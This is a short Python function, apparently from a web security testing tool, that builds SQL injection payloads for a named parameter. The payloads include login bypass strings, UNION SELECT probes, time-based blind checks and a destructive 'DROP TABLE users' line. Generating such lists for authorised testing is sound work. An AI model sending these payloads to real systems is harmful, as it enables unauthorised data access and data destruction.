def generate_sqli_payloads(param_name):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL, NULL --",
        "1' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' OR sleep(5) --",
        "1' UNION SELECT NULL, version() --",
    ]

    formatted_payloads = [f"{param_name}={payload}" for payload in payloads]
    return formatted_payloads
